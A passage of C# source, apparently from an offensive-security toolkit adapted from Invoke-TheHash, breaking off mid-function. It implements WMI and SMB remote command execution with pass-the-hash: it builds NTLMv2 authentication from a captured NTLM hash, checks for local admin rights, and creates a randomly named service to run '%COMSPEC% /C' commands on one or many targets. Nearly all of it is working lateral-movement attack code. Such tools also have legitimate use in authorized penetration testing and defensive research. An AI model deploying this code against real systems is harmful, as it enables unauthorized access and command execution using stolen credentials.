0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x6f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x3a, 0x57, 0x69, 0x6e, 0x33, 0x32, 0x5f, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x75, 0x70 })
                                                            .Concat(new byte[501])
                                                            .Concat(Command_Length)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3c, 0x0e, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x01 })
                                                            .Concat(Command_Length2)
                                                            .Concat(new byte[] { 0x00, 0x80, 0x00, 0x5f, 0x5f, 0x50, 0x41, 0x52, 0x41, 0x4d, 0x45, 0x54, 0x45, 0x52, 0x53, 0x00, 0x00 })
                                                            .Concat(Command_Bytes)
                                                            .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
    
                                                        if (Stub_Data.Length < Request_Split_Index)
                                                        {
                                                            Request_Flags = new byte[] { 0x83 };
                                                            WMI_Client_Stage_Next = "Result";
                                                        }
                                                        else
                                                        {
                                                            Request_Split = true;
                                                            double Request_Split_stage_final = Math.Ceiling((double)Stub_Data.Length / Request_Split_Index);
                                                            if (Request_Split_Stage < 2)
                                                            {
                                                                Request_Length = Stub_Data.Length;
                                                                Stub_Data = Utilities.GetByteRange(Stub_Data, 0, Request_Split_Index - 1);
                                                                Request_Split_Stage = 2;
                                                                Sequence_Number_Counter = 10;
                                                                Request_Flags = new byte[] { 0x81 };
                                                                Request_Split_Index_Tracker = Request_Split_Index;
                                                                WMI_Client_Stage_Next = "Request";
                                                            }
                                                            else if (Request_Split_Stage == Request_Split_stage_final)
                                                            {
                                                                Request_Split = false;
                                                                Sequence_Number = BitConverter.GetBytes(Sequence_Number_Counter);
                                                                Request_Split_Stage = 0;
                                                                Stub_Data = Utilities.GetByteRange(Stub_Data, Request_Split_Index_Tracker, Stub_Data.Length);
                                                                Request_Flags = new byte[] { 0x82 };
                                                                WMI_Client_Stage_Next = "Result";
                                                            }
                                                            else
                                                            {
                                                                Request_Length = Stub_Data.Length - Request_Split_Index_Tracker;
                                                                Stub_Data = Utilities.GetByteRange(Stub_Data, Request_Split_Index_Tracker, Request_Split_Index_Tracker + Request_Split_Index - 1);
                                                                Request_Split_Index_Tracker += Request_Split_Index;
                                                                Request_Split_Stage++;
                                                                Sequence_Number = BitConverter.GetBytes(Sequence_Number_Counter);
                                                                Sequence_Number_Counter++;
                                                                Request_Flags = new byte[] { 0x80 };
                                                                WMI_Client_Stage_Next = "Request";
                                                            }
                                                        }


                                                    }

                                                }
                                                break;
                                        }
                                        Packet_RPC = WMIExec.RPCRequest(Request_Flags, Stub_Data.Length, 16, Request_Auth_Padding, Request_Call_ID, Request_Context_ID, Request_Opnum, Request_UUID);

                                        if (Request_Split)
                                        {
                                            Packet_RPC["RPCRequest_AllocHint"] = BitConverter.GetBytes(Request_Length);
                                        }

                                        Packet_NTLMSSP_Verifier = WMIExec.NTLMSSPVerifier(Request_Auth_Padding, new byte[] { 0x04 }, Sequence_Number);
                                        NTLMSSP_Verifier = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Verifier);
                                        RPC_Sign = Sequence_Number.Concat(Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC))
                                            .Concat(Stub_Data)
                                            .Concat(Utilities.GetByteRange(NTLMSSP_Verifier, 0, Request_Auth_Padding + 7)).ToArray();

                                        RPC_Signature = HMAC_MD5.ComputeHash(RPC_Sign);
                                        RPC_Signature = Utilities.GetByteRange(RPC_Signature, 0, 7);
                                        Packet_NTLMSSP_Verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = RPC_Signature;
                                        NTLMSSP_Verifier = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Verifier);

                                        WMI_Client_Send = Utilities.ConvertFromPacketOrderedDictionary(Packet_RPC).Concat(Stub_Data).Concat(NTLMSSP_Verifier).ToArray();
                                        WMI_Client_Random_Port_Stream.Write(WMI_Client_Send, 0, WMI_Client_Send.Length);
                                        WMI_Client_Random_Port_Stream.Flush();

                                        if (!Request_Split)
                                        {
                                            WMI_Client_Random_Port_Stream.Read(WMI_Client_Receive, 0, WMI_Client_Receive.Length);
                                        }

                                        while (WMI_Client_Random_Port_Stream.DataAvailable)
                                        {
                                            WMI_Client_Random_Port_Stream.Read(WMI_Client_Receive, 0, WMI_Client_Receive.Length);
                                            Thread.Sleep(10);
                                        }
                                        WMI_Client_Stage = WMI_Client_Stage_Next;
                                    }
                                    break;
                                case "Result":
                                    {
                                        while (WMI_Client_Random_Port_Stream.DataAvailable)
                                        {
                                            WMI_Client_Random_Port_Stream.Read(WMI_Client_Receive, 0, WMI_Client_Receive.Length);
                                            Thread.Sleep(10);
                                        }

                                        if (WMI_Client_Receive[1145] != 9)
                                        {
                                            Target_Process_ID = Utilities.DataLength(1141, WMI_Client_Receive);
                                            success = true;
                                        }

                                        WMI_Client_Stage = "exit";
                                    }
                                    break;
                            }
                            Thread.Sleep(10);
                        }
                        WMI_Client_Random_Port.Close();
                        WMI_Client_Random_Port_Stream.Close();
                    }
                }
                WMI_Client.Close();
                WMI_Client_Stream.Close();
            }
            if (success)
            {
                output.AppendLine(String.Format("Command executed with process ID {0} on {1}", Target_Process_ID, Target_Long));
            }
            else
            {
                output.AppendLine("Process did not start, check your command");
            }
            return output.ToString();
        }


        /// <summary>
        /// Determines if a username and hash has administrative privilege on a Target
        /// </summary>
        /// <param name="username">The Username to query.</param>
        /// <param name="hash">The NTLM hash for the user</param>
        /// <param name="domain">The logon domain for the user</param>
        /// <param name="Target">The Target to query.</param>
        /// <returns>True for Admin, False for not.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static bool SMBAdminCheck(string username, string hash, string domain, string Target)
        {
            string result = SMBExecute(username, hash, domain, Target, AdminCheck: true);
            if (result.Contains(" is a local administrator on "))
                return true;
            else
                return false;
        }


        /// <summary>
        /// Execute a command against multiple targets using Pass the Hash and SMB
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="targets">The Target computers to run the command on.</param>
        /// <param name="command">The Command to execute on the Target</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="ServiceName">The name to give the SMB service for execution.</param>
        /// <param name="AdminCheck">Check only if user is Admin on targets.</param>
        /// <param name="ComSpec">Append %COMSPEC% /C to command. (default=true)</param>
        /// <param name="ForceSMB1">Force usage of SMBv1.</param>
        /// <param name="debug">Include debug information in the output.</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string SMBExecute(string username, string hash, string domain, List<string> targets, string command = "", int sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool debug = false)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var Target in targets)
            {
                sb.AppendLine(SMBExecute(username, hash, domain, Target, command, sleep, ServiceName, AdminCheck, ComSpec, ForceSMB1, debug));
            }

            return sb.ToString();
        }
        
        /// <summary>
        /// Execute a command against multiple targets using Pass the Hash and SMB
        /// </summary>
        /// <param name="username">The username to log on as.</param>
        /// <param name="hash">The NTLM hash for the user.</param>
        /// <param name="domain">The logon domain for the user.</param>
        /// <param name="Target">The Target computer to run the command on.</param>
        /// <param name="command">The Command to execute on the Target</param>
        /// <param name="sleep">Sleeptime between actions. Set this if getting unknown failures. (default=15). </param>
        /// <param name="ServiceName">The name to give the SMB service for execution.</param>
        /// <param name="AdminCheck">Check only if user is Admin on targets.</param>
        /// <param name="ComSpec">Append %COMSPEC% /C to command. (default=true)</param>
        /// <param name="ForceSMB1">Force usage of SMBv1.</param>
        /// <param name="debug">Include debug information in the output.</param>
        /// <returns>Returns a string containing execution results.</returns>
        /// <author>Scottie Austin (@checkymander)</author>
        /// <remarks>
        /// Based Heavily on Kevin Robertsons Invoke-TheHash toolset (Found
        /// at https://github.com/Kevin-Robertson/Invoke-TheHash)
        /// </remarks>
        public static string SMBExecute(string username, string hash, string domain, string Target, string command = "", int sleep = 15, string ServiceName = "", bool AdminCheck = false, bool ComSpec = true, bool ForceSMB1 = false, bool debug = false)
        {
            //Trackers
            bool Login_Successful = false;
            bool Service_Deleted = false;
            bool SMBExec_Failed = false;
            bool SMB_execute = false;
            bool SMB_Signing = false;
            string Output_Username;
            string processID = BitConverter.ToString(BitConverter.GetBytes(Process.GetCurrentProcess().Id)).Replace("-", "");
            string[] processID2 = processID.Split('-');
            StringBuilder output = new StringBuilder();
            int SMB2_Message_ID = 0;
            int SMB_Close_Service_Handle_Stage = 0;
            int SMB_Split_Stage = 0;
            int SMB_Split_Index_Tracker = 0;
            double SMB_Split_Stage_final = 0;
            //Communication
            byte[] SMBClientReceive = null;
            //Packet Reqs
            byte[] Process_ID_Bytes = Utilities.ConvertStringToByteArray(processID.ToString());
            byte[] SMB_Session_ID = null;
            byte[] Session_Key = null;
            byte[] SMB_Session_Key_Length = null;
            byte[] SMB_Negotiate_Flags = null;
            byte[] SMB2_Tree_ID = null;
            byte[] SMB_Client_Send = null;
            byte[] SMB_FID = new byte[2];
            byte[] SMB_Service_Manager_Context_Handle = null;
            byte[] SMB_Service_Context_Handle = null;
            byte[] SMB_Named_Pipe_Bytes = null;
            byte[] SMB_File_ID = null;
            byte[] SMB_User_ID = null;
            byte[] SMB_Header = null;
            byte[] SMB2_Header = null;
            byte[] SMB_Data = null;
            byte[] SMB2_Data = null;
            byte[] NetBIOS_Session_Service = null;
            byte[] NTLMSSP_Negotiate = null;
            byte[] NTLMSSP_Auth = null;
            byte[] SMB_Sign = null;
            byte[] SMB_Signature = null;
            byte[] SMB_Signature2 = null;
            byte[] SMB2_Sign = null;
            byte[] SMB2_Signature = null;
            byte[] SMB_Signing_Sequence = null;
            byte[] RPC_Data = null;
            byte[] SCM_Data = null;
            OrderedDictionary Packet_SMB_Header = null;
            OrderedDictionary Packet_SMB2_Header = null;
            OrderedDictionary Packet_SMB_Data = null;
            OrderedDictionary Packet_SMB2_Data = null;
            OrderedDictionary Packet_NTLMSSP_Negotiate = null;
            OrderedDictionary Packet_NTLMSSP_Auth = null;
            OrderedDictionary Packet_RPC_Data = null;
            OrderedDictionary Packet_SCM_Data = null;
            MD5CryptoServiceProvider MD5Crypto = new MD5CryptoServiceProvider();

            if (String.IsNullOrEmpty(username) || String.IsNullOrEmpty(hash) || String.IsNullOrEmpty(Target))
            {
                output.AppendLine("Missing Required Params");
            }
            else
            {
                if (hash.Contains(":"))
                    hash = hash.Split(':').Last();
            }
            if (!string.IsNullOrEmpty(domain))
                Output_Username = domain + '\\' + username;
            else
                Output_Username = username;


            if (!AdminCheck)
            {
                if (debug) { output.AppendLine("AdminCheck is false"); }
                if (!string.IsNullOrEmpty(command))
                {
                    if (debug) { output.AppendLine("String is not empty"); }
                    SMB_execute = true;
                }
            }

            TcpClient SMBClient = new TcpClient();
            SMBClient.Client.ReceiveTimeout = 60000;

            try
            {
                SMBClient.Connect(Target, 445);
            }
            catch
            {
                output.AppendLine("Could not connect to Target");
            }

            if (SMBClient.Connected)
            {
                if (debug) { output.AppendLine(String.Format("Connected to {0}", Target)); }
                NetworkStream SMBClientStream = SMBClient.GetStream();
                SMBClientReceive = new byte[1024];
                string SMBClientStage = "NegotiateSMB";

                while (SMBClientStage != "exit")
                {
                    if (debug) { output.AppendLine(String.Format("Current Stage: {0}", SMBClientStage)); }
                    switch (SMBClientStage)
                    {
                        case "NegotiateSMB":
                            {
                                Packet_SMB_Header = new OrderedDictionary();
                                Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x72 }, new byte[] { 0x18 }, new byte[] { 0x01, 0x48 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, new byte[] { 0x00, 0x00 });
                                Packet_SMB_Data = SMBExec.SMBNegotiateProtocolRequest(ForceSMB1);
                                SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                if (BitConverter.ToString(new byte[] { SMBClientReceive[4], SMBClientReceive[5], SMBClientReceive[6], SMBClientReceive[7] }).ToLower() == "ff-53-4d-42")
                                {
                                    ForceSMB1 = true;
                                    if (debug) { output.AppendLine("Using SMB1"); }
                                    SMBClientStage = "NTLMSSPNegotiate";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[39] }).ToLower() == "0f")
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
                                        SMB_Signing = true;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };

                                    }
                                    else
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                        SMB_Signing = false;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x05, 0x82, 0x08, 0xa0 };

                                    }
                                }
                                else
                                {
                                    if (debug) { output.AppendLine("Using SMB2"); }
                                    SMBClientStage = "NegotiateSMB2";
                                    if (BitConverter.ToString(new byte[] { SMBClientReceive[70] }) == "03")
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is Enabled"); }
                                        SMB_Signing = true;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x15, 0x82, 0x08, 0xa0 };
                                    }
                                    else
                                    {
                                        if (debug) { output.AppendLine("SMB Signing is not Enforced"); }
                                        SMB_Signing = false;
                                        SMB_Session_Key_Length = new byte[] { 0x00, 0x00 };
                                        SMB_Negotiate_Flags = new byte[] { 0x05, 0x80, 0x08, 0xa0 };
                                    }
                                }
                            }
                            break;
                        case "NegotiateSMB2":
                            {
                                SMB2_Message_ID = 1;
                                Packet_SMB2_Header = new OrderedDictionary();
                                SMB2_Tree_ID = new byte[] { 0x00, 0x00, 0x00, 0x00 };
                                SMB_Session_ID = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
                                Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x00, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                Packet_SMB2_Data = SMBExec.SMB2NegotiateProtocolRequest();
                                SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                SMBClientStage = "NTLMSSPNegotiate";

                            }
                            break;
                        case "NTLMSSPNegotiate":
                            {
                                SMB_Client_Send = null;
                                if (ForceSMB1)
                                {
                                    Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, new byte[] { 0x00, 0x00 });

                                    if (SMB_Signing)
                                    {
                                        Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                                    }
                                    Packet_NTLMSSP_Negotiate = SMBExec.NTLMSSPNegotiate(SMB_Negotiate_Flags, null);
                                    SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                                    NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                                    Packet_SMB_Data = SMBExec.SMBSessionSetupAndXRequest(NTLMSSP_Negotiate);
                                    SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                                }
                                else
                                {
                                    Packet_SMB2_Header = new OrderedDictionary();
                                    SMB2_Message_ID += 1;
                                    Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x01, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                                    Packet_NTLMSSP_Negotiate = SMBExec.NTLMSSPNegotiate(SMB_Negotiate_Flags, null);
                                    SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                                    NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                                    Packet_SMB2_Data = SMBExec.SMB2SessionSetupRequest(NTLMSSP_Negotiate);
                                    SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                                }
                                SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);
                                SMBClientStage = "exit";
                            }
                            break;

                    }
                }
                if (debug) { output.AppendLine(String.Format("Authenticating to {0}", Target)); }
                string SMB_NTLSSP = BitConverter.ToString(SMBClientReceive);
                SMB_NTLSSP = SMB_NTLSSP.Replace("-", "");
                int SMB_NTLMSSP_Index = SMB_NTLSSP.IndexOf("4E544C4D53535000");
                int SMB_NTLMSSP_Bytes_Index = SMB_NTLMSSP_Index / 2;
                int SMB_Domain_Length = Utilities.DataLength(SMB_NTLMSSP_Bytes_Index + 12, SMBClientReceive);
                int SMB_Target_Length = Utilities.DataLength(SMB_NTLMSSP_Bytes_Index + 40, SMBClientReceive);
                SMB_Session_ID = Utilities.GetByteRange(SMBClientReceive, 44, 51);
                byte[] SMB_NTLM_challenge = Utilities.GetByteRange(SMBClientReceive, SMB_NTLMSSP_Bytes_Index + 24, SMB_NTLMSSP_Bytes_Index + 31);
                byte[] SMB_Target_Details = null;
                SMB_Target_Details = Utilities.GetByteRange(SMBClientReceive, (SMB_NTLMSSP_Bytes_Index + 56 + SMB_Domain_Length), (SMB_NTLMSSP_Bytes_Index + 55 + SMB_Domain_Length + SMB_Target_Length));
                byte[] SMB_Target_Time_Bytes = Utilities.GetByteRange(SMB_Target_Details, SMB_Target_Details.Length - 12, SMB_Target_Details.Length - 5);
                string hash2 = "";
                for (int i = 0; i < hash.Length - 1; i += 2) { hash2 += (hash.Substring(i, 2) + "-"); };
                byte[] NTLM_hash_bytes = (Utilities.ConvertStringToByteArray(hash.Replace("-", "")));
                string Auth_Hostname = Environment.MachineName;
                byte[] Auth_Hostname_Bytes = Encoding.Unicode.GetBytes(Auth_Hostname);
                byte[] Auth_Domain_Bytes = Encoding.Unicode.GetBytes(domain);
                byte[] Auth_Username_Bytes = Encoding.Unicode.GetBytes(username);
                byte[] Auth_Domain_Length = BitConverter.GetBytes(Auth_Domain_Bytes.Length);
                Auth_Domain_Length = new byte[] { Auth_Domain_Length[0], Auth_Domain_Length[1] };
                byte[] Auth_Username_Length = BitConverter.GetBytes(Auth_Username_Bytes.Length);
                Auth_Username_Length = new byte[] { Auth_Username_Length[0], Auth_Username_Length[1] };
                byte[] Auth_Hostname_Length = BitConverter.GetBytes(Auth_Hostname_Bytes.Length);
                Auth_Hostname_Length = new byte[] { Auth_Hostname_Length[0], Auth_Hostname_Length[1] };
                byte[] Auth_Domain_offset = new byte[] { 0x40, 0x00, 0x00, 0x00 };
                byte[] Auth_Username_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + 64);
                byte[] Auth_Hostname_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + 64);
                byte[] Auth_LM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 64);
                byte[] Auth_NTLM_Offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + 88);
                HMACMD5 HMAC_MD5 = new HMACMD5();
                HMAC_MD5.Key = NTLM_hash_bytes;
                string Username_And_Target = username.ToUpper();
                byte[] Username_Bytes = Encoding.Unicode.GetBytes(Username_And_Target);
                byte[] Username_And_Target_bytes = Username_Bytes.Concat(Auth_Domain_Bytes).ToArray();
                byte[] NTLMv2_hash = HMAC_MD5.ComputeHash(Username_And_Target_bytes);
                Random r = new Random();
                byte[] Client_Challenge_Bytes = new byte[8];
                r.NextBytes(Client_Challenge_Bytes);



                byte[] Security_Blob_Bytes = (new byte[] { 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                    .Concat(SMB_Target_Time_Bytes)
                    .Concat(Client_Challenge_Bytes)
                    .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 })
                    .Concat(SMB_Target_Details)
                    .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }).ToArray();
                byte[] Server_Challenge_And_Security_Blob_Bytes = Server_Challenge_And_Security_Blob_Bytes = SMB_NTLM_challenge.Concat(Security_Blob_Bytes).ToArray();
                HMAC_MD5.Key = NTLMv2_hash;
                byte[] NTLMv2_Response = HMAC_MD5.ComputeHash(Server_Challenge_And_Security_Blob_Bytes);
                if (SMB_Signing)
                {
                    byte[] Session_Base_Key = HMAC_MD5.ComputeHash(NTLMv2_Response);
                    Session_Key = Session_Base_Key;
                    HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                    HMAC_SHA256.Key = Session_Key;
                }
                NTLMv2_Response = NTLMv2_Response.Concat(Security_Blob_Bytes).ToArray();
                byte[] NTLMv2_Response_Length = BitConverter.GetBytes(NTLMv2_Response.Length);
                NTLMv2_Response_Length = new byte[] { NTLMv2_Response_Length[0], NTLMv2_Response_Length[1] };
                byte[] SMB_Session_Key_offset = BitConverter.GetBytes(Auth_Domain_Bytes.Length + Auth_Username_Bytes.Length + Auth_Hostname_Bytes.Length + NTLMv2_Response.Length + 88);

                byte[] NTLMSSP_response = (new byte[] { 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00 })
                        .Concat(Auth_LM_Offset)
                        .Concat(NTLMv2_Response_Length)
                        .Concat(NTLMv2_Response_Length)
                        .Concat(Auth_NTLM_Offset)
                        .Concat(Auth_Domain_Length)
                        .Concat(Auth_Domain_Length)
                        .Concat(Auth_Domain_offset)
                        .Concat(Auth_Username_Length)
                        .Concat(Auth_Username_Length)
                        .Concat(Auth_Username_Offset)
                        .Concat(Auth_Hostname_Length)
                        .Concat(Auth_Hostname_Length)
                        .Concat(Auth_Hostname_Offset)
                        .Concat(SMB_Session_Key_Length)
                        .Concat(SMB_Session_Key_Length)
                        .Concat(SMB_Session_Key_offset)
                        .Concat(SMB_Negotiate_Flags)
                        .Concat(Auth_Domain_Bytes)
                        .Concat(Auth_Username_Bytes)
                        .Concat(Auth_Hostname_Bytes)
                        .Concat(new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 })
                        .Concat(NTLMv2_Response).ToArray();
                if (ForceSMB1)
                {
                    Packet_SMB_Header = new OrderedDictionary();
                    SMB_User_ID = new byte[] { SMBClientReceive[32], SMBClientReceive[33] };
                    Packet_SMB_Header = SMBExec.SMBHeader(new byte[] { 0x73 }, new byte[] { 0x18 }, new byte[] { 0x07, 0xc8 }, new byte[] { 0xff, 0xff }, Process_ID_Bytes, new byte[] { 0x00, 0x00 });

                    if (SMB_Signing)
                    {
                        Packet_SMB_Header["SMBHeader_Flags2"] = new byte[] { 0x05, 0x48 };
                    }

                    Packet_SMB_Header["SMBHeader_UserID"] = SMB_User_ID;
                    Packet_NTLMSSP_Negotiate = SMBExec.NTLMSSPAuth(NTLMSSP_response);
                    SMB_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Header);
                    NTLMSSP_Negotiate = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Negotiate);
                    Packet_SMB_Data = SMBExec.SMBSessionSetupAndXRequest(NTLMSSP_Negotiate);
                    SMB_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB_Data);
                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB_Header.Length, SMB_Data.Length);

                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB_Header).Concat(SMB_Data).ToArray();
                }
                else
                {
                    SMB2_Message_ID += 1;
                    Packet_SMB2_Header = SMBExec.SMB2Header(new byte[] { 0x01, 0x00 }, SMB2_Message_ID, SMB2_Tree_ID, SMB_Session_ID);
                    Packet_NTLMSSP_Auth = SMBExec.NTLMSSPAuth(NTLMSSP_response);
                    SMB2_Header = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Header);
                    NTLMSSP_Auth = Utilities.ConvertFromPacketOrderedDictionary(Packet_NTLMSSP_Auth);
                    Packet_SMB2_Data = SMBExec.SMB2SessionSetupRequest(NTLMSSP_Auth);
                    SMB2_Data = Utilities.ConvertFromPacketOrderedDictionary(Packet_SMB2_Data);
                    NetBIOS_Session_Service = GetNetBIOSSessionService(SMB2_Header.Length, SMB2_Data.Length);
                    SMB_Client_Send = NetBIOS_Session_Service.Concat(SMB2_Header).Concat(SMB2_Data).ToArray();
                }



                SMBClientReceive = SendStream(SMBClientStream, SMB_Client_Send);

                if (ForceSMB1)
                {
                    if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 9, 12)) == "00-00-00-00")
                    {
                        if (debug) { output.AppendLine("Authentication Successful"); }
                        Login_Successful = true;
                    }
                    else
                    {
                        output.AppendLine("Unable to authenticate to Target.");
                        return output.ToString();
                    }
                }
                else
                {
                    if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 12, 15)) == "00-00-00-00")
                    {
                        if (debug) { output.AppendLine("Authentication Successful"); }
                        Login_Successful = true;
                    }
                    else
                    {
                        output.AppendLine("Unable to Authenticate to Target.");
                        return output.ToString();
                    }
                }

                if (debug) { output.AppendLine(String.Format("Login Status: {0}", Login_Successful)); }
                if (Login_Successful)
                {
                    byte[] SMBExec_Command;
                    byte[] SMB_Path_Bytes;
                    string SMB_Path = "\\\\" + Target + "\\IPC$";
                    
                    if (ForceSMB1)
                    {
                        SMB_Path_Bytes = Encoding.UTF8.GetBytes(SMB_Path).Concat(new byte[] { 0x00 }).ToArray();
                    }
                    else
                    {
                        SMB_Path_Bytes = Encoding.Unicode.GetBytes(SMB_Path);
                    }

                    byte[] SMB_named_pipe_UUID = { 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03 };
                    byte[] SMB_Service_Bytes;
                    string SMB_Service = null;
                    if (string.IsNullOrEmpty(ServiceName))
                    {
                        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                        var rand = new Random();
                        SMB_Service = new string(Enumerable.Repeat(chars, 20).Select(s => s[rand.Next(s.Length)]).ToArray());
                        SMB_Service_Bytes = Encoding.Unicode.GetBytes(SMB_Service).Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                    }
                    else
                    {
                        SMB_Service = ServiceName;
                        SMB_Service_Bytes = Encoding.Unicode.GetBytes(SMB_Service);
                        if (Convert.ToBoolean(SMB_Service.Length % 2))
                        {
                            SMB_Service_Bytes = SMB_Service_Bytes.Concat(new byte[] { 0x00, 0x00 }).ToArray();
                        }
                        else
                        {
                            SMB_Service_Bytes = SMB_Service_Bytes.Concat(new byte[] { 0x00, 0x00, 0x00, 0x00 }).ToArray();
                        }
                    }
                    if (debug) { output.AppendLine(String.Format("Service Name is {0}", SMB_Service)); }
                    byte[] SMB_Service_Length = BitConverter.GetBytes(SMB_Service.Length + 1);

                    if (ComSpec)
                    {
                        if (debug) { output.AppendLine("Appending %COMSPEC% /C"); }

                        command = "%COMSPEC% /C \"" + command + "\"";
                    }

